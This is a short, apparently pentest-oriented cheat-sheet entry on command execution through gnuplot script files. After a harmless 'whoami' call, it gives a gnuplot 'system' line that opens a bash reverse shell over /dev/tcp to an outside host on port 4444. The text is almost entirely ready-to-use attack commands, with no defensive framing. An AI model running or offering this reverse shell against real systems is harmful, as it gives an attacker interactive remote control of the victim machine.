Command Execution

The script file of gnuplot can be used to execute system commands as below.

gnuplot test.plt

Contents of the .plt is like the following.

system "whoami"

# Reverse shell
system "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
